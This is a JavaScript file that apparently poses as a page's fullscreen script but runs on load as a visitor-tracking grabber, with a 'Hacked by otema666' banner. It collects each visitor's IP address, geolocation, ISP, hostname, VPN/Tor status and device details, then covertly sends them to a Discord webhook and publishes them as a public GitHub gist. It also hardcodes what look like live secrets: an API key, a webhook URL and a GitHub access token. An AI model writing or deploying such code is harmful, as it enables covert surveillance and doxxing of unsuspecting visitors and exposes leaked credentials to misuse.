function device_info_object () {
    var info = {
    SO: detectOS(),
    Navegador: detectBrowser(),
    Phone_device: is_mobile(),
    Hora: detectTime(),
    Idioma: navigator.language,
    Resolution: detectResolution(),
    resolucion_html_x: window.innerWidth,
    resolucion_html_y: window.innerHeight,
    vendor: navigator.vendor,
    userAgent: navigator.userAgent,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints
    };
    
    return info
  };

function device_info() {
  var info = device_info_object();

  var json = "";
  for (var key in info) {
      json += key + ': ' + info[key] + "\n";
  }
  
  return json;
};

function detectOS() {
  let os = navigator.userAgent;
  let finalOs="";
  if (os.search('Windows')!==-1){
      finalOs = "Windows";
  } else if (os.search('Mac')!==-1){
      finalOs = "MacOS";
  } else if (os.search('X11')!==-1 && !(os.search('Linux')!==-1)){
      finalOs = "UNIX";
  } else if (os.search('Linux')!==-1 && os.search('X11')!==-1){
      finalOs = "Linux"
  } else if (os.search('Android')!==-1){
      finalOs = "Android"
  } else if (os.search('iPhone')){
      finalOs = "iPhone"
  } else {
    finalOs = "yokse"
  }
  return finalOs

};

function detectBrowser() {
  let userAgent = navigator.userAgent;
  let browserName;

  if (userAgent.match(/chrome|chromium|crios/i)) {
      browserName = "Chrome";
  } else if (userAgent.match(/firefox|fxios/i)) {
      browserName = "Firefox";
  } else if (userAgent.match(/safari/i)) {
      browserName = "Safari";
  } else if (userAgent.match(/opr\//i)) {
      browserName = "Opera";
  } else if (userAgent.match(/edg/i)) {
      browserName = "Edge";
  } else {
      browserName = "No browser detection";
  }

  return browserName
};

function is_mobile() {
  var a;
  if (navigator.userAgent.match(/Android/i) ||
      navigator.userAgent.match(/webOS/i) ||
      navigator.userAgent.match(/iPhone/i) ||
      navigator.userAgent.match(/iPad/i) ||
      navigator.userAgent.match(/iPod/i) ||
      navigator.userAgent.match(/BlackBerry/i) ||
      navigator.userAgent.match(/Windows Phone/i)) {
      a = "Yes";
  } else {
      a = "No";
  }
  return a;
};

function detectResolution() {
  resol = [
    "\n\t" + "Window size: " + window.innerWidth + 'x' + window.innerHeight + "\n\t" +
    "Screen size: " + window.screen.width + 'x' + window.screen.height + "\n\t" +
    "Available screen size: " + window.screen.availWidth + 'x' + window.screen.availHeight + "\n\t" +
    "Color depth: " + window.screen.colorDepth + "\n\t" +
    "Orientation: " + (window.screen.orientation ? window.screen.orientation.type : "N/A") + "\n\t" +
    "Orientation Lock: " + (window.screen.orientation ? window.screen.orientation.locked : "N/A") + "\n\t" +
    "TimeZone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n"
  ];

  return resol
};

function detectTime() {
  var currentTime = new Date();
  var hours = currentTime.getHours();
  var minutes = currentTime.getMinutes();
  var seconds = currentTime.getSeconds();

  minutes = (minutes < 10 ? "0" : "") + minutes;
  seconds = (seconds < 10 ? "0" : "") + seconds;

  var formattedTime = hours + ":" + minutes + ":" + seconds;
  return formattedTime;
}

// Request a la api de vpnapi.io, funciones async, 
  // request de curl:
    // $ curl 'https://vpnapi.io/api/'"$(curl ifconfig.me)"'?key=f0b7f18a3e7541149ae064d21b443589'
    // $ curl 'https://ipinfo.io/'"$(curl ifconfig.me)"'/org'  <- ISP
    // $ curl 'https://ipinfo.io/'"$(curl ifconfig.me)"'/hostname'  <- hostname

const apikey = "f0b7f18a3e7541149ae064d21b443589";

async function detectVPN(ip) {
  try {
    const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
    const response = await fetch(apiUrl);
    const data = await response.json();
    return data.security.vpn;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function detectLocation(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    var place = `${data.location.country}, ${data.location.region}, ${data.location.city}`
    var objeto_html = {
      pais: data.location.country,
      region: data.location.region,
      ciudad: data.location.city,
    }
    return {place, objeto_html};
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function generateLink(ip, site) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    var latitude = data.location.latitude;
    var longitude = data.location.longitude;
    var maps_url = `https://google.com/maps/place/${latitude},${longitude}`;
    var myipaddress_url = `https://whatismyipaddress.com/ip/${ip}`;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
    
  if (site == "maps") {
    return maps_url
  } else {
    return myipaddress_url
  }
  
};

async function generateImgUrl(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    var county_code = data.location.country_code;
    var country_codeLower = county_code.toLowerCase();
    var url = `https://flagcdn.com/48x36/${country_codeLower}.png`
    return url;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function detectAllSecurity(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    
    var security = "";
    for (var key in data.security) {
      security += '\t' + key + ': ' + data.security[key] + "\n";
    }
    return security;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function detectAllLocation(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    
    var all_location = "";
    for (var key in data.location) {
      all_location += '\t' + key + ': ' + data.location[key] + "\n";
    }
    return all_location;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

function imgOS() { 
  var OSname = detectOS()
  if (OSname == "Linux") {
    return "https://i.ibb.co/1LPzy3g/Tux-svg.png"
    // return "images/chat.png"
  }else if (OSname == "Windows") {
    return "https://i.ibb.co/G2J8fYb/windows-logo-logok-0-copy-150x140-1.png"
  }else if (OSname == "Mac") {
    return "https://i.ibb.co/mqTsJnJ/2235.png"
  } else if (OSname == "Android") {
    return "https://i.ibb.co/4Rw04Bn/android-logo-0.png"
  } else if (OSname == "iPhone") {
    return "https://i.ibb.co/tbGkRzd/IMG-20230728-002213-1.jpg"
  }else { 
    return "https://cdn.discordapp.com/attachments/1123285343697907732/1134260568446992394/IMG_20230727_232342.jpg"
  }
}

async function detectISP(ip) {
  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    var ISP = `${data.network.autonomous_system_number} ${data.network.autonomous_system_organization}`
    return ISP;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
};

async function detecthostname(ip) {
  const apiUrl = `https://ipinfo.io/${ip}/json`
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    
    var hostname = data.hostname;
    return hostname;
  } catch (error) {
    console.error(error);
    throw new Error("Error al hacer la consulta a la API");
  }
}

function generateHTMLForScreenshot(data) {
  const html = `
    <!DOCTYPE html>
    <html>
      <head>
        <title>IP Information</title>
        <style>
        body {
          font-family: Arial, sans-serif;
          background-color: #333;
          color: #ddd;
        }
        .container {
          background-color: #333;
          padding: 25px;
          border-color: #888;
          border-style: solid;
          border-width: 6px;
        }
        h1 {
          color: #ffc107;
          text-align: center;
        }
        h2 {
          color: #f44336;
          border-bottom: 1px solid #ddd;
          padding-bottom: 5px;
          margin-top: 20px;
        }
        table {
          width: 100%;
          border-collapse: collapse;
          margin-bottom: 15px;
        }
        th, td {
          padding: 8px;
          border-bottom: 1px solid #ddd;
          text-align: left;
        }
        .green {
          color: green;
        }
        .red {
          color: red;
        }
        footer {
          text-align: center;
          font-size: 16px;
          margin-top: 20px;
          background-color: #2a2a2a;
          color: #00FF00;
          padding: 10px 0;
          border-radius: 10px;
          font-family: 'Courier New', monospace;
          letter-spacing: 6px;
        }
      </style>
      </head>
      <body>
          <div class="container">
              <h1>IP: <span class="green">${data.ip}</span></h1>
              
              <h2>ISP & hostname:</h2>
              <p>ISP: ${data.ISP}</p>
              <p>Hostname: ${data.hostname}</p>

              <h2>Geolocation Information:</h2>
              <p>Country: <span class='green'>${data.location.pais}</span></p>
              <p>Region: <span class='green'>${data.location.region}</span></p>
              <p>City: <span class='green'>${data.location.ciudad}</span></p>
              
              <h2>Security Information:</h2>
              <p>VPN: <span class="${data.is_vpn ? 'green' : 'red'}">${data.is_vpn ? 'Yes' : 'No'}</span></p>
              <p>Proxy: <span class="${data.is_proxy ? 'green' : 'red'}">${data.is_proxy ? 'Yes' : 'No'}</span></p>
              <p>Tor: <span class="${data.is_tor ? 'green' : 'red'}">${data.is_tor ? 'Yes' : 'No'}</span></p>

              <h2>Device info:</h2>
              <p>Operating system: <span class='green'>${device_info_object().SO}</span></p>
              <p>Browser: <span class='green'>${device_info_object().Navegador}</span></p>
              <p>Phone device?: <span class="${device_info_object().Phone_device ? 'green' : 'red'}">${device_info_object().Phone_device ? 'Yes' : 'No'}</span></p>
              <p>Device language: <span class='green'>${device_info_object().Idioma}</span></p>
              <p>Device time: <span class='green'>${device_info_object().Hora}</span></p>
              <p>
                Resolución de la pantalla: <span class='green'>${device_info_object().resolucion_html_x}</span> <span class='red'>x</span><span class='green'>${device_info_object().resolucion_html_y}</span>
              </p>
              <footer>Hacked by otema666</footer>
          </div>
          
      </body>
    </html>
  `;
  return html;
}

function generateAndSendImageToDiscord(data) {
  const html = generateHTMLForScreenshot(data);

  const container = document.createElement('div');
  container.style.width = '550px';
  container.innerHTML = html;
  document.body.appendChild(container);

  html2canvas(container).then(canvas => {
      const imgDataUrl = canvas.toDataURL();

      const formData = new FormData();
      formData.append('file', dataURItoBlob(imgDataUrl), 'image.png');
      fetch('https://discord.com/api/webhooks/1128070706798792828/R1CVOSbGgwkuViDOdkhLhvYzNdhnndMywgxmMo8t3IUrTVAl_k3ibubjoFeRJS4NKcs2', {
          method: 'POST',
          body: formData
      });
  });

  document.body.removeChild(container); // Elimina el contenido temporalmente creado
}

function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(',')[1]);
  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
      ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}

async function crearEnlaceGist(informacion) {
  const accessToken = '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'; // Reemplaza con tu token de acceso
  const gistData = {
    description: 'Hacked by otema666',
    public: true,
    files: {
      'info.md': {
        content: informacion
      }
    }
  };

  const response = await fetch('https://api.github.com/gists', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${accessToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(gistData)
  });

  const data = await response.json();
  const gistId = data.id;
  const gistLink = data.html_url;

  //console.log(`Enlace al gist en GitHub: ${gistLink}`);
  return gistLink;
}



// Send data & collect ip
var ip = '';
fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(async function(data) {
    ip = data.ip;
    var webwhook = 'https://discord.com/api/webhooks/1128070706798792828/R1CVOSbGgwkuViDOdkhLhvYzNdhnndMywgxmMo8t3IUrTVAl_k3ibubjoFeRJS4NKcs2';
    texto = '__**Grabbed Info**__\n' +
    '```js\n' +
    'IP: ' + ip + '\n' +
    'VPN: ' + is_vpn + '\n' +
    'ISP: ' + ISP + '\n' +
    'Hostname: ' + hostname + '\n' +
    'Lugar: ' + location + '\n' +
    '------------------------------\n\n' +
    device_info() + '\n------ ------ ------\n' +
    'All Security:\n' + security + '\n------ ------ ------\n' +
    'All Location:\n' + all_location +
    '```\n' +
    '### Maps: ' + maps_url + '\n' + 
    '### My ip address: ' + myipaddress_url;
    try {
        var is_vpn = await detectVPN(ip);
        var location = (await detectLocation(ip)).place;
        var location_html = (await detectLocation(ip)).objeto_html;
        var security = await detectAllSecurity(ip);
        var all_location = await detectAllLocation(ip);
        var maps_url = await generateLink(ip, "maps");
        var myipaddress_url = await generateLink(ip, "myipaddress");
        var flagUrl = await generateImgUrl(ip);
        var osIMG = imgOS();
        var ISP = await detectISP(ip);
        var hostname = await detecthostname(ip);
        var gistLink = await crearEnlaceGist(texto)
        
    } catch(error) {
        console.log(error);
    }
    const infoData = {
      is_vpn: is_vpn,
      ip: ip,
      ISP: ISP,
      hostname: hostname,
      location: location_html,
      device_info: 'Sample Device Info',
      security: 'Sample Security Info',
      all_location: 'Sample All Location Info',
      maps_url: 'https://maps.example.com',
      myipaddress_url: 'https://myip.example.com'
  };
  
    var message = {
      content: `**Nuevo usuario!!**\n\nLink a la info detallada: ${gistLink}`,

      embeds: [
        {
          image: {
            url: flagUrl
          }
        },
        {
          image: {
            url: osIMG
          }
        }
      ]
    };

    fetch(webwhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
generateAndSendImageToDiscord(infoData);

  });


// El real fullscreen.js
function aceptar() {
  document.getElementById("contenido").style.display = "block";
  document.getElementById("mensaje").style.display = "none";
  document.documentElement.requestFullscreen();
};